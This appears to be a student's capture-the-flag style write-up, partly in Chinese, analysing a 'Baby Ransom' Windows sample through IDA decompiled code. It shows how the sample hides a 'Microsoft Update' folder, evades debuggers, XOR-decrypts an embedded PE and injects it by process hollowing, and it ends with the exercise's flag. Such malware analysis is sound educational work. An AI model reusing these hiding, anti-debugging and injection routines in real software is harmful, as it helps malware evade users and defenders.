# Simple Reverse 0x30(2023 HW - Baby Ransom 1)
## Background
[VirtualProtect 函式](https://learn.microsoft.com/zh-tw/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect)
[記憶體保護常數](https://learn.microsoft.com/zh-tw/windows/win32/Memory/memory-protection-constants)
[InternetOpenUrlA 函式](https://learn.microsoft.com/zh-tw/windows/win32/api/wininet/nf-wininet-internetopenurla)
[SetFileAttributesW 函式](https://learn.microsoft.com/zh-tw/windows/win32/api/fileapi/nf-fileapi-setfileattributesw)
[Schtasks 工作排程 ](http://stenwang.blogspot.com/2015/09/schtasks.html)
[IsDebuggerPresent 函式](https://learn.microsoft.com/zh-tw/windows/win32/api/debugapi/nf-debugapi-isdebuggerpresent)
[FindResourceA 函式](https://learn.microsoft.com/zh-tw/windows/win32/api/winbase/nf-winbase-findresourcea)
[LoadResource 函式](https://learn.microsoft.com/zh-tw/windows/win32/api/libloaderapi/nf-libloaderapi-loadresource)
## Source code
:::spoiler IDA Main Function
```cpp!
int __cdecl main(int argc, const char **argv, const char **envp)
{
  // [COLLAPSED LOCAL DECLARATIONS. PRESS KEYPAD CTRL-"+" TO EXPAND]

  StackBase = NtCurrentTeb()->NtTib.StackBase;
  while ( 1 )
  {
    DestInitValue = _InterlockedCompareExchange64(&qword_140017050, StackBase, 0i64);
    if ( !DestInitValue )
    {
      v5 = 0;
      goto LABEL_7;
    }
    if ( StackBase == DestInitValue )
      break;
    Sleep(1000u);
  }
  v5 = 1;
LABEL_7:
  if ( unk_140017058 == 1 )
  {
    amsg_exit(31i64);
  }
  else if ( unk_140017058 )
  {
    dword_140017008 = 1;
  }
  else
  {
    unk_140017058 = 1;
    initterm(&qword_140019018, qword_140019028);
  }
  if ( unk_140017058 == 1 )
  {
    initterm(&qword_140019000, &qword_140019010);
    unk_140017058 = 2;
  }
  if ( !v5 )
    _InterlockedExchange64(&qword_140017050, 0i64);
  if ( TlsCallback_0 )
    TlsCallback_0(0i64, 2);
  sub_14000226B();
  v6 = 0i64;
  qword_1400170E0 = SetUnhandledExceptionFilter(&loc_140002530);
  (InterlockedExchange64)(nullsub_1);
  InitFloatUnit();
  v7 = dword_140017028;
  space = malloc(8i64 * (dword_140017028 + 1));
  v9 = qword_140017020;
  space_cp = space;
  while ( v7 > v6 )
  {
    size = strlen(*(v9 + 8 * v6)) + 1;
    dest = malloc(size);
    *(space_cp + 8 * v6) = dest;
    src = *(v9 + 8 * v6++);
    qmemcpy(dest, src, size);
  }
  qword_140017020 = space_cp;
  if ( v7 < 0 )
    v7 = 0i64;
  *(space_cp + 8 * v7) = 0i64;
  sub_140001F1E();
  _initenv = qword_140017018;
  dword_140017010 = (NetworkConfig_1DBB)(dword_140017028, qword_140017020);// 0x140017020 => 0x254CA9C1580
  if ( !dword_14001700C )
    exit(dword_140017010);
  if ( !dword_140017008 )
    cexit();
  return dword_140017010;
}
```
:::
:::spoiler IDA NetworkConfig_1DBB
```cpp!
__int64 NetworkConfig_1DBB()
{
  void *hInternet; // [rsp+38h] [rbp-18h]

  sub_140001F1E();
  hInternet = InternetOpenA(0i64, 1u, 0i64, 0i64, 0);
  if ( InternetOpenUrlA(hInternet, (LPCSTR)szUrl, 0i64, 0, 0x84000000, 0i64) )// INTERNET_FLAG_RELOAD + INTERNET_FLAG_NO_CACHE_WRITE
                                                // => retrieve the orginal item
                                                // => don't write this item to the cache
    return 0i64;
  else
    return Reverse_URL_Part1();
}
```
:::
:::spoiler IDA Reverse_URL_Part1
```cpp=
__int64 Reverse_URL_Part1()
{
  PWSTR ppszPathOut; // [rsp+38h] [rbp-38h] BYREF
  int char_1; // [rsp+44h] [rbp-2Ch]
  PWSTR ppszPath; // [rsp+48h] [rbp-28h] BYREF
  LPWSTR lpFilename; // [rsp+50h] [rbp-20h]
  LPWSTR lpWideCharStr; // [rsp+58h] [rbp-18h]
  int cchWideChar; // [rsp+64h] [rbp-Ch]
  int j; // [rsp+68h] [rbp-8h]
  int i; // [rsp+6Ch] [rbp-4h]

  if ( SHGetKnownFolderPath((const KNOWNFOLDERID *const)&unk_14000AA80, KF_FLAG_DEFAULT, 0i64, &ppszPath) )
    return 0i64;
  for ( i = 7; i <= 22; i += 4 )
  {
    char_1 = *(_DWORD *)((char *)szUrl + i);
    for ( j = 0; j <= 3; ++j )
    {
      LOBYTE(char_1) = char_1 - 43;
      char_1 = __ROR4__(char_1, 8);
    }
    char_1 ^= 0x6F6F6F6Fu;
    *(_DWORD *)((char *)szUrl + i) = char_1;
  }
  HIBYTE(szUrl[2]) = 0;
  cchWideChar = MultiByteToWideChar(CP_UTF8, 0, (LPCCH)szUrl + 7, -1, 0i64, 0);
  if ( !cchWideChar )
    return 0i64;
  lpWideCharStr = (LPWSTR)malloc(2i64 * cchWideChar);
  if ( !lpWideCharStr )
    return 0i64;
  MultiByteToWideChar(CP_UTF8, 0, (LPCCH)szUrl + 7, -1, lpWideCharStr, cchWideChar);
  if ( PathAllocCombine(ppszPath, lpWideCharStr, PATHCCH_NONE, &ppszPathOut) )
  {
    free(lpWideCharStr);
    return 0i64;
  }
  else
  {
    CreateDirectoryW(ppszPathOut, 0i64);
    SetFileAttributesW(ppszPathOut, 0x26u);     // FILE_ATTRIBUTE_ARCHIVE + FILE_ATTRIBUTE_SYSTEM + FILE_ATTRIBUTE_HIDDEN
    lpFilename = (LPWSTR)malloc(0x208ui64);
    GetModuleFileNameW(0i64, lpFilename, 0x104u);
    if ( PathAllocCombine(ppszPathOut, lpWideCharStr, 0, &ppszPathOut) )
    {
      free(lpWideCharStr);
      free(lpFilename);
      return 0i64;
    }
    else if ( MoveFileW(lpFilename, ppszPathOut) )
    {
      SetFileAttributesW(ppszPathOut, 0x26u);   // FILE_ATTRIBUTE_ARCHIVE + FILE_ATTRIBUTE_SYSTEM + FILE_ATTRIBUTE_HIDDEN
      free(lpWideCharStr);
      free(lpFilename);
      return Reverse_URL_Part2(ppszPathOut);
    }
    else
    {
      free(lpWideCharStr);
      free(lpFilename);
      ImportatntPart();
      return 0i64;
    }
  }
}
```
:::
:::spoiler IDA NextStagePayload
```cpp=
void __stdcall NextStagePayload()
{
  if ( !(unsigned int)off_140007088()           // isDebuggerPresent
    || !*(_QWORD *)(qword_140017030 + 8)
    || strcmp((const char *)(*(_QWORD *)(qword_140017030 + 8) + 9i64), "start!!") )
  {
    Reverse_URL_Part3_getEmbeddedPeFile_();
  }
}
```
:::
:::spoiler IDA Reverse_URL_Part3_getEmbeddedPeFile_
```cpp=
void __stdcall Reverse_URL_Part3_getEmbeddedPeFile_()
{
  __int64 v0; // [rsp+58h] [rbp-28h] BYREF
  __int64 Buffer; // [rsp+60h] [rbp-20h] BYREF
  int v2; // [rsp+6Ch] [rbp-14h]
  struct _PROCESS_INFORMATION ProcessInformation; // [rsp+70h] [rbp-10h] BYREF
  struct _STARTUPINFOA StartupInfo; // [rsp+90h] [rbp+10h] BYREF
  DWORD v5; // [rsp+104h] [rbp+84h] BYREF
  int *v6; // [rsp+108h] [rbp+88h] BYREF
  LPCONTEXT lpContext; // [rsp+110h] [rbp+90h]
  int j; // [rsp+118h] [rbp+98h]
  int i; // [rsp+11Ch] [rbp+9Ch]

  getEmbeddedPE_File((LPVOID *)&v6, &v5);
  memset(&StartupInfo, 0, sizeof(StartupInfo));
  StartupInfo.cb = 104;
  memset(&ProcessInformation, 0, sizeof(ProcessInformation));
  for ( i = 121; i <= 124; i += 4 )
  {
    v2 = *(_DWORD *)&szUrl[i];
    for ( j = 0; j <= 3; ++j )
    {
      LOBYTE(v2) = v2 - 80;
      v2 = __ROR4__(v2, 8);
    }
    v2 ^= 0x7E7E7E7Eu;
    *(_DWORD *)&szUrl[i] = v2;
  }
  szUrl[125] = 0;
  CreateProcessA(0i64, &szUrl[121], 0i64, 0i64, 0, 4u, 0i64, 0i64, &StartupInfo, &ProcessInformation);
  lpContext = (LPCONTEXT)VirtualAlloc(0i64, 0x4D0ui64, 0x1000u, 4u);
  lpContext->ContextFlags = 0x10000B;
  if ( GetThreadContext(ProcessInformation.hThread, lpContext) )
  {
    sub_1400013B4(v6, v5, ProcessInformation.hProcess, &Buffer, &v0);
    WriteProcessMemory(ProcessInformation.hProcess, (LPVOID)(lpContext->Rdx + 16), &Buffer, 8ui64, 0i64);
    lpContext->Rcx = v0 + Buffer;
    SetThreadContext(ProcessInformation.hThread, lpContext);
    ResumeThread(ProcessInformation.hThread);
    CloseHandle(ProcessInformation.hProcess);
    CloseHandle(ProcessInformation.hThread);
  }
}
```
:::
:::spoiler IDA getEmbeddedPE_File
```cpp=
HRSRC __fastcall getEmbeddedPE_File(LPVOID *pe_file, DWORD *ResourceSize)
{
  HRSRC result; // rax
  HRSRC hResInfo; // [rsp+30h] [rbp-10h]
  unsigned int i; // [rsp+3Ch] [rbp-4h]

  result = FindResourceA(0i64, (LPCSTR)'D', (LPCSTR)0x84);
  hResInfo = result;
  if ( result )
  {
    result = (HRSRC)LoadResource(0i64, result);
    if ( result )
    {
      *pe_file = LockResource(result);
      result = (HRSRC)*pe_file;
      if ( *pe_file )
      {
        *ResourceSize = SizeofResource(0i64, hResInfo);
        result = (HRSRC)*ResourceSize;          // 0x1ca00
        if ( (_DWORD)result )
        {
          for ( i = 0; ; i += 2 )
          {
            result = (HRSRC)*ResourceSize;
            if ( i >= (unsigned int)result )
              break;
            *(_WORD *)((char *)*pe_file + (int)i) ^= 0x8711u;
          }
        }
      }
    }
  }
  return result;
}
```
:::
:::spoiler IDA 
```cpp=

```
:::
## Recon
從source code上到下慢慢解析，這一題很難的地方在於很多東西都是runtime才決定的，包含embedded pe file，或者是一些function pointer，所以只能慢慢跟著動態去猜他的行為
1. main function中可以直接看到下面一點的地方，上面只是一些初始化，不用管他，真正在import embedded payload或是進行攻擊的地方在下面的NetworkConfig_1DBB
2. 說是network config其實和網路操作沒啥屁毛關係，只是前期分析的時候看到有InternetOpen相關的API就先這樣寫，再加上他給了一個https開頭的strings，但看了一圈其實只是scramble過後的payload再加上https，所以其實也和連線沒關係。簡單說一下這一段，詳細可以看一下前面MSDN的background，`InternetOpenUrlA`中帶的`0x84000000`，我看[csdn分析WannaCry的文章](https://blog.csdn.net/qq_43667823/article/details/129952684)表示，是INTERNET_FLAG_RELOAD + INTERNET_FLAG_NO_CACHE_WRITE的結果，也就是從server端拉資料下來，然後不會把結果存到cache中，但這一切我認為都是為了混淆reverse的人，因為`InternetOpenUrl`會對給予的`szUrl`進行連線，有成功的話才會進到if-statement，但他遠永不會成功，因為仔細看`szUrl`其實是`http://M17H+G+4FzeJ69F5.*f)vfquhvnv)*fwdhud)*vf)lpktud)*lj)4)*uk)',27h,'Lpfwjvjcu)Rpkejrv)Tyehu'`，所以直接分析下面的部分就好
3. 進到part 1的地方先看到一個for loop，那個就是在還原scramble url的部分，還原的結果是`Microsoft Update`，接著下面會把path combine在一起，並且創一個folder，並設定屬性為`FILE_ATTRIBUTE_ARCHIVE` + `FILE_ATTRIBUTE_SYSTEM` + `FILE_ATTRIBUTE_HIDDEN`，所以必須把file explorer的隱藏系統檔案的選項取消，才看得到
    ![圖片.png](https://hackmd.io/_uploads/rJUGKcO7T.png)
    接著下面的nested if statement有點迷，基本上第一次執行一定會直接進到最後的else，因為基本上`lpFilename`剛創好空間，本身應該沒東西，所以`MoveFile`當然不會成功，接著就進到最後的`ImportantPart`了
4. 持續跟進會先進到`NextStatePayload`，這一段有個小地方可以注意，也就是`(unsigned int)off_140007088()`，這是個function pointer，主要做的事情就是`isDebuggerPresent`，所以如果有使用x64dbg的話要記得開Scylla Hide的Anti Anti Debugger，這樣才會進到if statement去取得embedded pe file(雖然就算不設定，第二個判斷式也應該會是true才對)
    ![圖片.png](https://hackmd.io/_uploads/rJw_q5OXa.png)
5. 終於進到最關鍵的部分了，首先一開始遇到的function其實就是在還原embedded pe file，主要的操作是先取得resource$\to$`00007ff7f219b048`
    ![圖片.png](https://hackmd.io/_uploads/BJM9hq_Xp.png)
    再藉由`LoadResource`取得真正的resource$\to$`00007ff7f219b058`
    然後取得該resource的大小$\to$`0x1ca00`
    
    * 最重要的部分就是每兩個byte都進行XOR `0x8711`的動作，直到`0x1ca00`都做完，這一部分就是解密embedded pe file，解密完可以很明顯看到`MD`這個magic signature
        ![圖片.png](https://hackmd.io/_uploads/Bk0nGouQ6.png)
    * 因此只要利用Scylla把這一部分的memory dump出來再拿去md5 file取得hash就可以了
        ![圖片.png](https://hackmd.io/_uploads/S1CGXjum6.png)
        ![圖片.png](https://hackmd.io/_uploads/H1JEmjOXa.png)

Flag: `FLAG{e6b77096375bcff4c8bc765e599fbbc0}`